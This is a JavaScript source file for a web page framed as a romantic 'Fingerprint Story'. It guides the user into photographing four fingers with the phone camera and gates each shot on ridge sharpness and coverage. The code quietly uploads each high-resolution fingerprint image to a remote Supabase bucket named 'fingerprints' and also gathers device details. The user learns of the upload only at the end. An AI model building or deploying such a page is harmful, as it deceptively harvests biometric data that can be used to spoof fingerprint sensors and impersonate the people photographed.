// ---- Device Information ----
(() => {
  const NA = 'Not available';
  const ua = navigator.userAgent;
  const uaData = navigator.userAgentData;
  const $ = id => document.getElementById(id);

  const isIPad = /Macintosh/.test(ua) && navigator.maxTouchPoints > 1;
  let device = 'Desktop';
  if (/iPad/i.test(ua) || isIPad) device = 'Tablet';
  else if (/Android/i.test(ua) && !/Mobi/i.test(ua)) device = 'Tablet';
  else if (/Mobi|Android|iPhone|iPod/i.test(ua) || (uaData && uaData.mobile)) device = 'Mobile';

  let os = NA;
  if (/Android/i.test(ua) || (uaData && uaData.platform === 'Android')) os = 'Android';
  else if (/iPhone|iPad|iPod/.test(ua) || isIPad) os = 'iOS';
  else if (/Windows/i.test(ua)) os = 'Windows';
  else if (/Mac OS X|Macintosh/i.test(ua)) os = 'macOS';
  else if (/Linux/i.test(ua)) os = 'Linux';

  const pick = (re, name) => {
    const m = ua.match(re);
    return m ? name + ' ' + m[1] : null;
  };
  const browser =
    pick(/Edg\/([\d.]+)/, 'Edge') ||
    pick(/OPR\/([\d.]+)/, 'Opera') ||
    pick(/Firefox\/([\d.]+)/, 'Firefox') ||
    pick(/Chrome\/([\d.]+)/, 'Chrome') ||
    pick(/Version\/([\d.]+).*Safari/, 'Safari') ||
    NA;

  const readOrientation = () => {
    const t = screen.orientation && screen.orientation.type;
    if (t) return t.startsWith('landscape') ? 'Landscape' : 'Portrait';
    return window.innerWidth > window.innerHeight ? 'Landscape' : 'Portrait';
  };
  const refresh = () => {
    $('di-viewport').textContent = window.innerWidth + ' × ' + window.innerHeight;
    $('di-orientation').textContent = readOrientation();
  };

  $('di-device').textContent = device;
  $('di-os').textContent = os;
  $('di-browser').textContent = browser;
  $('di-screen').textContent = screen.width + ' × ' + screen.height;
  $('di-lang').textContent = navigator.language || NA;
  $('di-tz').textContent = Intl.DateTimeFormat().resolvedOptions().timeZone || NA;
  refresh();

  if (os !== 'Android') {
    $('di-android-row').hidden = true;
  } else if (uaData && uaData.getHighEntropyValues) {
    uaData.getHighEntropyValues(['platformVersion'])
      .then(v => { if (v.platformVersion) $('di-android').textContent = v.platformVersion.split('.')[0]; })
      .catch(() => {});
  }
  addEventListener('resize', refresh);
})();


// ---- Supabase (optional direct upload) ----
const SUPABASE_URL = 'https://ezmcxetphpxkdqydhpxr.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_eFNwkWSJ0PIW6UO1VpR-Ig_rfJ2agpy';
const SUPABASE_BUCKET = 'fingerprints';
const sb = (SUPABASE_URL && SUPABASE_ANON_KEY && window.supabase)
  ? window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY)
  : null;


// ---- Fingerprint Story ----
const FINGERS = [
  { id: 'index',  name: 'Index finger',  theme: 'The Beginning',
    quote: 'Every story starts with a first step. Maybe this one started before either of you noticed.' },
  { id: 'middle', name: 'Middle finger', theme: 'The Bond',
    quote: "Some connections don't need constant words. They simply become part of the rhythm of everyday life." },
  { id: 'ring',   name: 'Ring finger',   theme: 'The Promise 💍',
    quote: 'A reminder that the most meaningful promises are often written through actions, not words.' },
  { id: 'little', name: 'Little finger', theme: 'The Secret',
    quote: 'The smallest fingerprint keeps the quietest story — the little things only two people understand.' },
];

const ROI = 0.62;
const INTERVAL = 300;          // one analysis tick
const VERIFY_TICKS = 5;        // 5 × 300 ms ≈ 1.5 s verification hold
const STABILITY_MIN = 50;
const MAX_SIDE = 1600;

// ---- Quality gates ----
const MIN_SHARPNESS_HARD  = 12;
const MIN_SHARPNESS_READY = 28;
const MIN_CONTRAST_READY  = 14;
const MIN_COVERAGE_READY  = 14;
const MIN_FILL_READY      = 45;   // % of ROI blocks containing real texture
const MIN_BRIGHTNESS      = 12;
const MAX_BRIGHTNESS      = 90;

const $ = id => document.getElementById(id);
const stageEl = document.querySelector('.stage');
const video = $('video'), roiEl = $('roi'), focusEl = $('focus');
const statusEl = $('status'), metricsEl = $('metrics'), hintEl = $('hint');
const stepLabel = $('stepLabel');
const successEl = $('success'), thumb = $('thumb');
const successTitle = $('successTitle'), themeEl = $('theme'), quoteEl = $('quote');
const captureUI = $('captureUI'), finalEl = $('final'), fpList = $('fpList'), finalNote = $('finalNote');
const beginBtn = $('begin'), continueBtn = $('continue'), torchBtn = $('torch'), retryBtn = $('retry');
const progressRing = $('progress'), ringFg = $('ringFg');

const canvas = document.createElement('canvas');
const ctx = canvas.getContext('2d');

const qN = 128;
const qCanvas = document.createElement('canvas');
qCanvas.width = qCanvas.height = qN;
const qCtx = qCanvas.getContext('2d', { willReadFrequently: true });

const sN = 32;
const sCanvas = document.createElement('canvas');
sCanvas.width = sCanvas.height = sN;
const sCtx = sCanvas.getContext('2d');

let stream = null;
let step = -1;
let running = false;
let verifyCount = 0;
let lastGray = null;
let torchOn = false;
const captured = {};


// ---- Geometry ----
function roiRect() {
  const w = video.videoWidth || 1, h = video.videoHeight || 1;
  const side = Math.round(Math.min(w, h) * ROI);
  return { x: (w - side) >> 1, y: (h - side) >> 1, side };
}

function placeRoi() {
  const vw = video.videoWidth, vh = video.videoHeight;
  if (!vw || !vh) return;
  const cw = video.clientWidth, ch = video.clientHeight;
  const scale = Math.max(cw / vw, ch / vh);
  const ox = (cw - vw * scale) / 2;
  const oy = (ch - vh * scale) / 2;
  const r = roiRect();
  roiEl.style.left = (ox + r.x * scale) + 'px';
  roiEl.style.top  = (oy + r.y * scale) + 'px';
  roiEl.style.width  = (r.side * scale) + 'px';
  roiEl.style.height = (r.side * scale) + 'px';
}

function crop() {
  const r = roiRect();
  const side = Math.min(r.side, MAX_SIDE);
  canvas.width = canvas.height = side;
  ctx.drawImage(video, r.x, r.y, r.side, r.side, 0, 0, side, side);
}


// ---- Quality analysis ----
function stability() {
  sCtx.drawImage(canvas, 0, 0, sN, sN);
  const d = sCtx.getImageData(0, 0, sN, sN).data;
  const g = new Float32Array(sN * sN);
  for (let i = 0; i < g.length; i++) g[i] = (d[i*4] + d[i*4+1] + d[i*4+2]) / 3;
  let diff = 0;
  if (lastGray) {
    for (let i = 0; i < g.length; i++) diff += Math.abs(g[i] - lastGray[i]);
    diff /= g.length;
  }
  lastGray = g;
  return Math.max(0, Math.min(100, Math.round(100 - diff * 3)));
}

function analyzeROI() {
  qCtx.drawImage(canvas, 0, 0, qN, qN);
  const d = qCtx.getImageData(0, 0, qN, qN).data;
  const n = qN * qN;

  const gray = new Float32Array(n);
  let sum = 0;
  for (let i = 0; i < n; i++) {
    const g = 0.299*d[i*4] + 0.587*d[i*4+1] + 0.114*d[i*4+2];
    gray[i] = g; sum += g;
  }
  const mean = sum / n;
  let vsum = 0;
  for (let i = 0; i < n; i++) { const dv = gray[i] - mean; vsum += dv*dv; }
  const std = Math.sqrt(vsum / n);

  let lapSum = 0, lapSqSum = 0, edges = 0;
  for (let y = 1; y < qN - 1; y++) {
    for (let x = 1; x < qN - 1; x++) {
      const i = y*qN + x;
      const lap = 4*gray[i] - gray[i-1] - gray[i+1] - gray[i-qN] - gray[i+qN];
      lapSum += lap; lapSqSum += lap*lap;
      const gx = gray[i+1] - gray[i-1];
      const gy = gray[i+qN] - gray[i-qN];
      if (gx*gx + gy*gy > 625) edges++;
    }
  }
  const npix = (qN - 2) * (qN - 2);
  const lapVar = lapSqSum / npix - (lapSum / npix) ** 2;

  const BLOCK = 16, GRID = qN / BLOCK;
  let activeBlocks = 0;
  for (let by = 0; by < GRID; by++) {
    for (let bx = 0; bx < GRID; bx++) {
      let bs = 0, bsSq = 0;
      for (let y = 0; y < BLOCK; y++) {
        for (let x = 0; x < BLOCK; x++) {
          const g = gray[(by*BLOCK+y)*qN + bx*BLOCK+x];
          bs += g; bsSq += g*g;
        }
      }
      const bn = BLOCK * BLOCK;
      const bMean = bs / bn;
      const bVar = bsSq / bn - bMean * bMean;
      if (bVar > 12 && bMean > 10 && bMean < 248) activeBlocks++;
    }
  }
  const fillRatio = Math.round(activeBlocks / (GRID * GRID) * 100);

  const brightness = Math.round(mean / 255 * 100);
  const contrast   = Math.min(100, Math.round(std * 0.9));
  const sharpness  = Math.min(100, Math.round(Math.sqrt(Math.max(0, lapVar)) * 1.2));
  const coverage   = Math.min(100, Math.round(edges / npix * 400));

  const fingerPresent =
    fillRatio >= MIN_FILL_READY &&
    coverage  >= MIN_COVERAGE_READY &&
    contrast  >= MIN_CONTRAST_READY &&
    brightness >= MIN_BRIGHTNESS &&
    brightness <= MAX_BRIGHTNESS;

  return { brightness, contrast, sharpness, coverage, fillRatio, fingerPresent };
}

// Single source of truth for "does this frame pass every gate".
function evaluateFrame(a, stab) {
  const brightnessScore = Math.max(0, 100 - Math.abs(a.brightness - 55) * 2);
  const score = Math.round((
    a.coverage * 0.35 + a.sharpness * 0.25 + a.contrast * 0.15 +
    brightnessScore * 0.15 + stab * 0.10
  ) * 10) / 10;

  if (!a.fingerPresent)                                 return { status: 'POOR', passes: false, reason: 'Place your finger inside the guide', score };
  if (a.brightness < MIN_BRIGHTNESS || a.brightness > MAX_BRIGHTNESS) return { status: 'POOR', passes: false, reason: 'Low light — turn on Flash',          score };
  if (a.sharpness < MIN_SHARPNESS_HARD)                 return { status: 'POOR', passes: false, reason: 'Fingerprint is blurry — hold still', score };
  if (a.sharpness < MIN_SHARPNESS_READY)                return { status: 'FAIR', passes: false, reason: 'Fingerprint is blurry — hold still', score };
  if (a.contrast  < MIN_CONTRAST_READY)                 return { status: 'FAIR', passes: false, reason: 'Improve lighting or contrast',       score };
  if (a.coverage  < MIN_COVERAGE_READY)                 return { status: 'FAIR', passes: false, reason: 'Place your finger inside the guide',  score };
  if (a.fillRatio < MIN_FILL_READY)                     return { status: 'FAIR', passes: false, reason: 'Place your finger inside the guide',  score };
  if (stab        < STABILITY_MIN)                      return { status: 'FAIR', passes: false, reason: 'Hold your finger still',             score };

  return { status: 'GOOD', passes: true, reason: '', score };
}

function renderMetrics(a, stab, score, status) {
  metricsEl.textContent =
    'Finger detected: ' + (a.fingerPresent ? 'YES' : 'NO') + '\n' +
    'ROI sharpness:   ' + a.sharpness + '\n' +
    'ROI brightness:  ' + a.brightness + '\n' +
    'ROI contrast:    ' + a.contrast + '\n' +
    'ROI fill:        ' + a.fillRatio + '%\n' +
    'ROI coverage:    ' + a.coverage + '\n' +
    'Stable:          ' + (stab >= STABILITY_MIN ? 'YES' : 'NO') + '\n' +
    'Verify:          ' + Math.min(100, Math.round(verifyCount / VERIFY_TICKS * 100)) + '%\n' +
    'Ready:           ' + (status === 'GOOD' && verifyCount >= VERIFY_TICKS ? 'YES' : 'NO') + '\n' +
    'Score:           ' + score;
}

function setStatus(text, cls) {
  statusEl.textContent = text;
  statusEl.className = 'status ' + cls;
  stageEl.className = 'stage ' + cls;
}

function updateProgress(pct) {
  const C = 283; // 2π × r(45) ≈ 282.74
  progressRing.style.opacity = pct > 0 ? '1' : '0';
  ringFg.style.strokeDashoffset = C - (C * pct / 100);
}


// ---- Canvas validity ----
function isCanvasValid() {
  if (!canvas.width || !canvas.height || canvas.width < 32 || canvas.height < 32) return false;
  qCtx.drawImage(canvas, 0, 0, qN, qN);
  const d = qCtx.getImageData(0, 0, qN, qN).data;
  const n = qN * qN;
  let min = 255, max = 0, sum = 0, sumSq = 0;
  for (let i = 0; i < n; i++) {
    const g = (d[i*4] + d[i*4+1] + d[i*4+2]) / 3;
    if (g < min) min = g;
    if (g > max) max = g;
    sum += g; sumSq += g * g;
  }
  const mean = sum / n;
  const variance = sumSq / n - mean * mean;
  return (max - min) > 8 && variance > 4 && mean > 1 && mean < 254;
}


// ---- Tap-to-focus ----
function focusIndicator(x, y, supported) {
  const rect = stageEl.getBoundingClientRect();
  focusEl.style.left = (x - rect.left) + 'px';
  focusEl.style.top  = (y - rect.top) + 'px';
  focusEl.classList.toggle('unsupported', !supported);
  focusEl.hidden = false;
  focusEl.style.animation = 'none';
  void focusEl.offsetWidth;
  focusEl.style.animation = '';
  clearTimeout(focusEl._t);
  focusEl._t = setTimeout(() => { focusEl.hidden = true; }, 700);
}

async function tapToFocus(x, y) {
  const track = stream?.getVideoTracks()[0];
  const caps = track?.getCapabilities?.() || {};
  if (!track || !caps.focusMode || !caps.focusMode.includes('single-shot')) {
    focusIndicator(x, y, false);
    return;
  }
  const rect = video.getBoundingClientRect();
  const fx = Math.max(0, Math.min(1, (x - rect.left) / rect.width));
  const fy = Math.max(0, Math.min(1, (y - rect.top) / rect.height));
  try {
    await track.applyConstraints({
      advanced: [{ focusMode: 'single-shot', points: [{ x: fx, y: fy }] }],
    });
    focusIndicator(x, y, true);
  } catch {
    focusIndicator(x, y, false);
  }
}


// ---- Torch ----
async function setupTrack() {
  const track = stream?.getVideoTracks()[0];
  if (!track) return;
  const caps = track.getCapabilities?.() || {};

  if (caps.focusMode && caps.focusMode.includes('continuous')) {
    track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] }).catch(() => {});
  }

  if (!caps.torch) {
    torchBtn.disabled = true;
    torchBtn.textContent = '🔦 Flash not supported';
  } else {
    torchBtn.disabled = false;
    torchBtn.textContent = torchOn ? '🔦 Flash: ON' : '🔦 Flash: OFF';
    torchBtn.classList.toggle('on', torchOn);
  }
}

async function toggleTorch() {
  const track = stream?.getVideoTracks()[0];
  if (!track) return;
  const caps = track.getCapabilities?.() || {};
  if (!caps.torch) return;

  const next = !torchOn;
  try {
    await track.applyConstraints({ advanced: [{ torch: next }] });
    torchOn = next;
    torchBtn.textContent = next ? '🔦 Flash: ON' : '🔦 Flash: OFF';
    torchBtn.classList.toggle('on', next);
  } catch { /* ignored */ }
}


// ---- Verification loop ----
function loop() {
  if (!running) return;

  crop();
  const stab = stability();
  const a = analyzeROI();
  const m = evaluateFrame(a, stab);

  renderMetrics(a, stab, m.score, m.status);

  if (m.passes) {
    verifyCount++;
    const pct = Math.min(100, Math.round(verifyCount / VERIFY_TICKS * 100));
    updateProgress(pct);
    hintEl.textContent = '';

    if (verifyCount >= VERIFY_TICKS) {
      running = false;
      setStatus('Hold still · 100%', 'good');
      attemptFingerprintCapture();
      return;
    }
    setStatus('Hold steady · ' + pct + '%', 'good');
  } else {
    if (verifyCount > 0) verifyCount = 0;
    updateProgress(0);
    setStatus(m.status, m.status.toLowerCase());
    hintEl.textContent = m.reason || '';
  }

  if (running) setTimeout(loop, INTERVAL);
}


// ---- THE only capture function ----
// Runs a fresh crop, re-validates the frame, then uploads. Never called from
// any timer, listener or detection callback other than `loop()`.
async function attemptFingerprintCapture() {
  crop();

  if (canvas.width < 32 || canvas.height < 32) return failCapture('Capture failed — try again');
  if (!isCanvasValid())                        return failCapture('Image not clear — please try again');

  const stab = stability();
  const a = analyzeROI();
  const m = evaluateFrame(a, stab);

  if (!m.passes) return failCapture('Image not clear — please try again');

  const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
  if (!blob || blob.size < 1000) return failCapture('Capture failed — try again');

  setStatus('Ready', 'ready');
  updateProgress(0);

  const url = URL.createObjectURL(blob);
  const finger = FINGERS[step];
  captured[finger.id] = url;

  uploadToSupabase(blob, finger.id).catch(() => {});
  showSuccess(finger, url);
}

function failCapture(msg) {
  running = false;
  verifyCount = 0;
  updateProgress(0);
  setStatus('Try again', 'poor');
  hintEl.textContent = msg;
  retryBtn.hidden = false;
}

async function uploadToSupabase(blob, name) {
  if (!sb) return;
  const { error } = await sb.storage.from(SUPABASE_BUCKET).upload(`${name}.png`, blob, {
    contentType: 'image/png',
    upsert: true,
  });
  if (error) throw error;
}

function showSuccess(finger, url) {
  thumb.src = url;
  successTitle.textContent = finger.name + ' captured';
  themeEl.textContent = finger.theme;
  quoteEl.textContent = finger.quote;
  successEl.hidden = false;
  captureUI.hidden = true;
  continueBtn.textContent = step < FINGERS.length - 1 ? 'Continue' : 'See the ending';
}

function startFinger(i) {
  step = i;
  stepLabel.textContent = 'Step ' + (i + 1) + ' of 4 — ' + FINGERS[i].name;
  successEl.hidden = true;
  captureUI.hidden = false;
  retryBtn.hidden = true;
  hintEl.textContent = '';
  verifyCount = 0;
  updateProgress(0);
  lastGray = null;
  setStatus('Position your finger', 'poor');
  running = true;
  loop();
}

function finish() {
  running = false;
  captureUI.hidden = true;
  successEl.hidden = true;
  finalEl.hidden = false;
  fpList.innerHTML = '';
  for (const f of FINGERS) {
    const li = document.createElement('li');
    const img = document.createElement('img');
    img.src = captured[f.id];
    const span = document.createElement('span');
    span.textContent = f.name.split(' ')[0] + ' ✓';
    li.append(img, span);
    fpList.appendChild(li);
  }
  finalNote.textContent = sb ? `Uploaded to Supabase · ${SUPABASE_BUCKET}` : 'Captured locally';
  if (stream) stream.getTracks().forEach(t => t.stop());
}

async function begin() {
  beginBtn.hidden = true;
  if (!stream) {
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { ideal: 'environment' }, width: { ideal: 1920 }, height: { ideal: 1080 } },
        audio: false,
      });
      video.srcObject = stream;
      await video.play();
      await setupTrack();
    } catch (e) {
      setStatus('Camera unavailable', 'poor');
      beginBtn.hidden = false;
      return;
    }
  }
  roiEl.hidden = false;
  placeRoi();
  startFinger(0);
}

function nextFinger() {
  if (step < FINGERS.length - 1) startFinger(step + 1);
  else finish();
}

beginBtn.onclick = begin;
continueBtn.onclick = nextFinger;
torchBtn.onclick = toggleTorch;
retryBtn.onclick = () => {
  retryBtn.hidden = true;
  hintEl.textContent = '';
  verifyCount = 0;
  updateProgress(0);
  lastGray = null;
  setStatus('Position your finger', 'poor');
  running = true;
  loop();
};
video.addEventListener('click', e => tapToFocus(e.clientX, e.clientY));
video.addEventListener('loadedmetadata', placeRoi);
window.addEventListener('resize', placeRoi);